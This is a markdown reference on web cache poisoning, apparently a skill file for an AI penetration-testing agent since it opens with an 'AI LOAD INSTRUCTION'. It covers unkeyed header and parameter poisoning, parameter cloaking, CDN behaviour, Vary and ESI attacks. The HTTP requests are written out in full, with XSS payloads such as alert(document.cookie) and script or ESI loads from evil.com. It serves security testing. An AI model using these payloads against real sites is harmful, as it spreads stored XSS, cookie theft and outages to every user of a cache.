# Web Cache Poisoning Techniques — Advanced Reference

> **AI LOAD INSTRUCTION**: Load this when you need clear cache poisoning vs deception distinction, unkeyed header/parameter poisoning techniques, Fat GET cache poisoning, parameter cloaking, CDN-specific behavior, or Vary header attacks. Assumes the main [SKILL.md](./SKILL.md) is already loaded for cache deception fundamentals.

---

## 1. WEB CACHE POISONING vs WEB CACHE DECEPTION

These are **distinct attack classes** — do not confuse them.

| Aspect | Cache Poisoning | Cache Deception |
|---|---|---|
| **Goal** | Serve **malicious content** to all users | Steal **victim's authenticated data** |
| **Who triggers** | Attacker sends poisoning request | Victim visits crafted URL |
| **What gets cached** | Attacker-controlled response (XSS, redirect) | Victim's authenticated response |
| **Who is harmed** | All users who hit the cache | The specific victim whose data is cached |
| **Attacker's role** | Active (sends request with unkeyed poison) | Passive (waits for victim, then reads cache) |
| **Key technique** | Unkeyed input manipulation | Path confusion / extension appending |
| **Detection signal** | Response contains unexpected injected content | Authenticated content accessible without auth |

### Attack Flow Comparison

```
CACHE POISONING:
  Attacker → sends request with X-Forwarded-Host: evil.com
  → Cache stores response with evil.com references
  → Normal users get poisoned response

CACHE DECEPTION:
  Attacker → tricks victim into visiting /profile/x.css
  → Server returns victim's profile data (ignores x.css)
  → Cache stores response (thinks it's static CSS)
  → Attacker fetches /profile/x.css → reads victim's data
```

---

## 2. UNKEYED HEADER POISONING

### 2.1 Cache Key Basics

The **cache key** is what the cache uses to determine if a stored response matches a request. Typically includes:
- HTTP method
- Host header
- URL path
- Query string (sometimes)

**NOT typically included** (= unkeyed):
- Most request headers
- Cookies (sometimes)
- Request body (for GET)

If an unkeyed input is **reflected** in the response, it can be poisoned.

### 2.2 X-Forwarded-Host Poisoning

The most common cache poisoning vector.

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

HTTP/1.1 200 OK
...
<script src="https://evil.com/static/app.js"></script>
```

If `X-Forwarded-Host` is not in the cache key but is reflected in the response → poison stores `evil.com` JavaScript for all users requesting `/`.

**Common reflection points**:
- `<script src="...">` and `<link href="...">`
- Open Graph meta tags: `<meta property="og:url" content="...">`
- Canonical links: `<link rel="canonical" href="...">`
- Resource prefetch: `<link rel="dns-prefetch" href="...">`
- Dynamic import maps

### 2.3 X-Forwarded-Scheme / X-Forwarded-Proto

Forces HTTPS → HTTP downgrade in cached response:

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Scheme: http

HTTP/1.1 301 Moved
Location: http://target.com/    ← now HTTP, not HTTPS
```

Cache stores a redirect to HTTP → MITM opportunity for all cached users.

### 2.4 X-Original-URL / X-Rewrite-URL

Some frameworks (IIS/ASP.NET, Symfony) use these headers to override the request path:

```http
GET / HTTP/1.1
Host: target.com
X-Original-URL: /admin/delete-user?id=1

Cache key = GET /
But server processes /admin/delete-user?id=1
Response gets cached under /
```

### 2.5 Multiple Host Headers

```http
GET / HTTP/1.1
Host: target.com
Host: evil.com

# Some caches key on first Host, some apps use last Host
# If cache keys on target.com but app reflects evil.com → poisoned
```

### 2.6 X-Forwarded-Port

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Port: 1337

# If port is reflected in absolute URLs:
# <a href="https://target.com:1337/path">
# May cause resource loading failures → DoS via cache poisoning
```

### 2.7 Discovery Methodology

```bash
# Step 1: Identify cache (check response headers)
curl -v https://target.com/ 2>&1 | grep -i "x-cache\|age\|via\|cf-cache"

# Step 2: Find reflected unkeyed headers
# Send request with unique header values:
curl -H "X-Forwarded-Host: canary123.com" https://target.com/ | grep "canary123"
curl -H "X-Forwarded-Scheme: canary" https://target.com/ | grep "canary"
curl -H "X-Original-URL: /canary" https://target.com/ | grep "canary"

# Step 3: Verify it's unkeyed
# Send normal request → check if canary value is in cached response:
curl https://target.com/ | grep "canary123"
# If found → successfully poisoned

# Tool: Param Miner (Burp extension) automates unkeyed header discovery
```

---

## 3. UNKEYED PARAMETER POISONING

### 3.1 Concept

Some query parameters are excluded from the cache key (for tracking, analytics, etc.) but are reflected in the response.

### 3.2 Common Unkeyed Parameters

```
utm_content      utm_source       utm_medium       utm_campaign
utm_term         fbclid           gclid            _ga
dclid            msclkid          mc_eid           ref
callback         jsonp            _                cb
```

### 3.3 Example Attack

```http
GET /page?utm_content="><script>alert(1)</script> HTTP/1.1
Host: target.com

HTTP/1.1 200 OK
...
<a href="/page?utm_content="><script>alert(1)</script>">Share</a>
```

Cache key: `GET /page` (utm_content excluded)
Response: contains XSS payload
Result: all users visiting `/page` get XSS.

### 3.4 Parameter Discovery

```bash
# Burp Param Miner: "Guess query parameters" scan

# Manual: append unique parameter and check if cache key changes
curl "https://target.com/page?cachebuster=abc123" -v
# → X-Cache: MISS (new cache entry? or same as /page?)

curl "https://target.com/page" -v
# → X-Cache: HIT and response matches previous? Then /page is the key (query excluded)
# → X-Cache: MISS? Then query IS in the key
```

### 3.5 Reflected Parameter in JavaScript

```http
GET /page?callback=alert HTTP/1.1

HTTP/1.1 200 OK
<script>
var config = {
  callback: "alert",  // reflected from query parameter
  ...
};
</script>
```

If `callback` is excluded from cache key but reflected in JavaScript:

```http
GET /page?callback=alert(document.cookie)// HTTP/1.1
```

Cached for all users requesting `/page`.

---

## 4. FAT GET CACHE POISONING

### 4.1 Concept

Some origins accept and process GET request **body** (despite RFC discouraging it). If the cache ignores the body (not in cache key) but the origin reflects body content, the response can be poisoned.

### 4.2 Example

```http
GET /api/config HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

callback=alert(1)

HTTP/1.1 200 OK
Content-Type: application/javascript
Cache-Control: public, max-age=3600

alert(1)({"theme":"default","lang":"en"})
```

Cache key: `GET /api/config` (body not included)
Response: contains attacker's callback value
Result: all users get `alert(1)` when loading `/api/config`.

### 4.3 Detection

```bash
# Step 1: Check if origin processes GET body
curl -X GET https://target.com/api/endpoint \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "param=canary_value"
# Check if canary_value appears in response

# Step 2: Check if response is cached
curl https://target.com/api/endpoint
# Check X-Cache header and whether canary_value persists

# If canary in cached response → Fat GET poisoning confirmed
```

### 4.4 Frameworks That Process GET Body

| Framework | GET Body Processing |
|---|---|
| Ruby on Rails | Yes (parsed by default) |
| Express.js | Depends on middleware (body-parser) |
| Django | Yes (request.POST populated for GET with body) |
| Flask | Yes (request.form available) |
| ASP.NET | Depends on model binding configuration |
| Spring | Depends on `@RequestBody` annotation |

---

## 5. PARAMETER CLOAKING

### 5.1 Semicolon as Parameter Separator

Some platforms treat `;` as a parameter separator, others don't:

```http
GET /page?legit=value;poison=xss HTTP/1.1

# Ruby on Rails: parses as two params: legit=value, poison=xss
# PHP: parses as one param: legit=value;poison=xss
# Cache (Varnish): may key on "legit=value;poison=xss" as opaque string
```

**Exploit**: if cache keys on full query string but back-end parses `;` as separator:

```http
GET /page?legit=value;callback=alert(1) HTTP/1.1

# Cache key: /page?legit=value;callback=alert(1)
# Origin parses: legit=value AND callback=alert(1)
# Response reflects: alert(1) in callback
# Next request to /page?legit=value;callback=alert(1) gets poisoned response
```

### 5.2 Different Delimiter Parsing

| Platform | `;` Behavior | `&` Behavior |
|---|---|---|
| PHP | Literal (part of value) | Parameter separator |
| Ruby on Rails | Parameter separator | Parameter separator |
| Java (Servlet) | Parameter separator (`;` in path = path parameter) | Parameter separator |
| ASP.NET | Depends on configuration | Parameter separator |
| Node.js (querystring) | Literal | Parameter separator |
| Python (urllib) | Can be configured as separator | Parameter separator |

### 5.3 Duplicate Parameters

```http
GET /page?param=safe&param=<script>alert(1)</script> HTTP/1.1

# Cache may key on first occurrence: param=safe
# Origin may use last occurrence: param=<script>alert(1)</script>
```

| Platform | Duplicate Parameter Behavior |
|---|---|
| PHP | Last value wins |
| ASP.NET | Comma-joined (both values) |
| Ruby on Rails | Last value wins |
| Python Flask | First value wins |
| Java Servlet | First value wins (`getParameter`), all values (`getParameterValues`) |
| Node.js Express | Array of all values |

### 5.4 URL Path Parameter Cloaking

```http
# Semicolons in URL path (Java servlet path parameters):
GET /page;jsessionid=abc;param=value HTTP/1.1

# Tomcat/Jetty: strips ;param=value from path
# Cache: may include full path in key or strip differently
```

---

## 6. CDN-SPECIFIC BEHAVIOR

### 6.1 Cloudflare

```
# Cache status header: cf-cache-status
# Values: HIT, MISS, EXPIRED, DYNAMIC, BYPASS

# Default caching: by file extension (.js, .css, .png, etc.)
# Query strings: included in cache key by default
# Headers in key: Host only

# Page Rules: can force cache of HTML / API responses
# Cache-Control respected: yes

# Bypass methods:
# - Set Cache-Control: no-cache on origin
# - Use __cf_chl_jschl_tk__ (Cloudflare challenge token) — not in key

# Interesting behaviors:
# - Cloudflare Workers can modify cache key
# - cf-connecting-ip header added (unkeyed, may be reflected)
# - True-Client-IP header (unkeyed on some plans)
```

### 6.2 AWS CloudFront

```
# Cache status header: x-cache (Hit from cloudfront / Miss from cloudfront)
# Also: x-amz-cf-id, x-amz-cf-pop

# Default cache key: Host + URI path + query string
# Query strings: can be configured (all, none, whitelist)
# Headers in key: configurable via Cache Policy (Host, Accept, etc.)
# Cookies in key: configurable (all, none, whitelist)

# Gotchas:
# - Default: query strings NOT in cache key (must configure)
# - Default: cookies NOT in cache key
# - Can whitelist specific headers/cookies into key

# Poisoning opportunity:
# If query strings excluded → append reflected param → poison
# If X-Forwarded-Host not in key but reflected → classic poisoning
```

### 6.3 Akamai

```
# Cache status header: X-Cache (TCP_HIT, TCP_MISS)
# Also: X-Akamai-Request-ID

# Cache key (default): Host + path + query (configurable)
# "Cache ID Modification" feature: custom key composition
# "Remove Vary Header" feature: strips Vary

# Interesting behaviors:
# - Pragma: akamai-x-cache-on (enable cache debug)
# - Pragma: akamai-x-get-cache-key (reveal cache key)
# - Akamai-Transform header (can affect response)
# - True-Client-IP (unkeyed, may be reflected)

# Revealing cache key (if debug enabled):
curl -H "Pragma: akamai-x-get-cache-key" https://target.com/ -v
```

### 6.4 Varnish

```
# Cache status header: X-Varnish (two IDs = HIT, one ID = MISS)
# Also: Age, Via (varnish)

# Default cache key: req.url (path + query)
# VCL customization: hash_data() in vcl_hash
# Default: does NOT cache requests with Cookie header

# Interesting behaviors:
# - obj.hits indicates number of cache hits
# - X-Varnish-Cache header (custom)
# - Builtin: strips If-Modified-Since on cache hit

# VCL key inspection:
# If you have access to VCL config, look at vcl_hash for key composition
# sub vcl_hash {
#   hash_data(req.url);
#   hash_data(req.http.host);
# }
```

### 6.5 Fastly

```
# Cache status header: X-Cache (HIT, MISS)
# Also: X-Served-By, X-Cache-Hits, X-Timer

# Fastly uses Varnish under the hood
# VCL-based configuration
# Default cache key: URL + Host
# Surrogate-Control header: overrides Cache-Control for CDN
# Fastly-Debug: 1 (if enabled → reveals cache details)

# Interesting behaviors:
# - Surrogate-Key header for purge targeting
# - stale-while-revalidate support
# - ESI (Edge Side Includes) support — can be attack vector
```

### 6.6 CDN Cache Key Comparison

| CDN | Default Cache Key Components | Query String Default | Cookie Default |
|---|---|---|---|
| Cloudflare | Host + path + query | Included | Excluded |
| CloudFront | Host + path (query configurable) | Excluded by default | Excluded |
| Akamai | Host + path + query | Included | Excluded |
| Varnish | URL (path + query) | Included | Excluded (no cache with Cookie) |
| Fastly | Host + URL | Included | Excluded |
| Nginx (proxy_cache) | `$scheme$proxy_host$request_uri` | Included | Excluded |

---

## 7. VARY HEADER MANIPULATION

### 7.1 How Vary Works

The `Vary` header tells caches which request headers affect the response. Cache must store separate entries for different values of Vary'd headers.

```http
HTTP/1.1 200 OK
Vary: Accept-Encoding, Accept-Language
```

This means: cache must key on `Accept-Encoding` AND `Accept-Language` values.

### 7.2 Cache Partitioning Attack

If `Vary` doesn't include a header that the application uses to generate different content:

```http
# Application returns different content based on User-Agent:
GET / HTTP/1.1
User-Agent: Mozilla/5.0 (mobile)
→ Returns mobile version

GET / HTTP/1.1  
User-Agent: Mozilla/5.0 (desktop)
→ Returns desktop version

# If Vary does NOT include User-Agent:
# Cache stores one response for all User-Agent values
# Attacker can poison mobile users with desktop content (or vice versa)
```

### 7.3 Vary Header Injection

If attacker can influence the Vary header value:

```http
# Application sets Vary based on request:
Vary: Accept-Encoding, X-Custom-Header

# If attacker adds X-Custom-Header:
GET / HTTP/1.1
X-Custom-Header: unique-value

# Cache creates new partition for this unique value
# Attacker poisons only this partition
# Then links victim to URL with same X-Custom-Header value
```

### 7.4 Vary: * (Wildcard)

```http
Vary: *
```

Tells cache to never serve cached version. Some caches respect this, others ignore it.

| CDN | Vary: * Behavior |
|---|---|
| Cloudflare | Does not cache |
| CloudFront | Does not cache |
| Varnish | Depends on VCL config |
| Nginx | Does not cache (default) |

### 7.5 Missing Vary as a Vulnerability

```
# Application returns personalized content:
GET /dashboard HTTP/1.1
Cookie: session=USER_A_TOKEN
→ Returns User A's dashboard

# If response lacks Vary: Cookie AND cache stores it:
# → User B requests /dashboard → gets User A's cached dashboard
# This IS cache deception (without the victim needing to visit a crafted URL)
```

---

## 8. ADVANCED TECHNIQUES

### 8.1 Cache Poisoning via Error Pages

```http
# Trigger a 404 with injected content:
GET /nonexistent%0D%0AX-Injected:%20yes HTTP/1.1
Host: target.com

# If 404 page reflects the requested path and is cached:
# All users requesting this path get the injected error page
```

### 8.2 Edge Side Includes (ESI) Injection

```http
# If CDN supports ESI and reflects unkeyed input:
GET / HTTP/1.1
X-Forwarded-Host: evil.com

Response:
<esi:include src="http://evil.com/xss.html"/>

# ESI is processed by the cache/CDN → fetches and includes evil content
```

### 8.3 Poisoning via Response Header Injection

```http
# If unkeyed header is reflected in response headers:
GET / HTTP/1.1
X-Custom: value\r\nSet-Cookie: admin=true

# Response:
X-Custom: value
Set-Cookie: admin=true

# Cached → all users get the injected Set-Cookie
```

### 8.4 Web Cache Poisoning DoS

```http
# Poison response to return 403/500/redirect:
GET / HTTP/1.1
X-Forwarded-Host: thisdoesnotexist.com

# If origin tries to load resources from thisdoesnotexist.com:
# Response has broken resources → cached → DoS for all users
```

### 8.5 Chaining Cache Poisoning + XSS

```http
# Step 1: Find unkeyed header reflected in HTML
GET /page HTTP/1.1
X-Forwarded-Host: "><script>alert(document.cookie)</script>.com

# Step 2: Response (if reflected unsanitized):
<link rel="canonical" href="https://"><script>alert(document.cookie)</script>.com/page">

# Step 3: Cache stores this response
# Step 4: All users visiting /page execute attacker's JavaScript
```

---

## 9. TESTING CHECKLIST

```
□ Identify cache layer and CDN product
  - Check: X-Cache, cf-cache-status, Age, Via, X-Varnish, X-Served-By
□ Determine cache key composition
  - Test: adding query params, headers, cookies — does cache key change?
□ Discover unkeyed inputs
  - Headers: X-Forwarded-Host, X-Forwarded-Scheme, X-Original-URL, True-Client-IP
  - Parameters: utm_*, fbclid, gclid, callback, jsonp
  - Body: GET request with body parameters
□ Check reflection of unkeyed inputs
  - In HTML body, JavaScript, response headers, redirect Location
□ Verify caching of poisoned response
  - X-Cache: HIT on follow-up clean request
  - Response still contains poison → confirmed
□ Test parameter cloaking
  - Semicolon separator differences
  - Duplicate parameter handling
□ Check Vary header
  - Missing Vary: Cookie on personalized content?
  - Can influence Vary header value?
□ CDN-specific tests
  - ESI support?
  - Debug headers enabled?
  - Cache key reveal features?
□ Impact assessment
  - Stored XSS via cache poisoning?
  - Account takeover via session fixation?
  - DoS via broken resources?
```
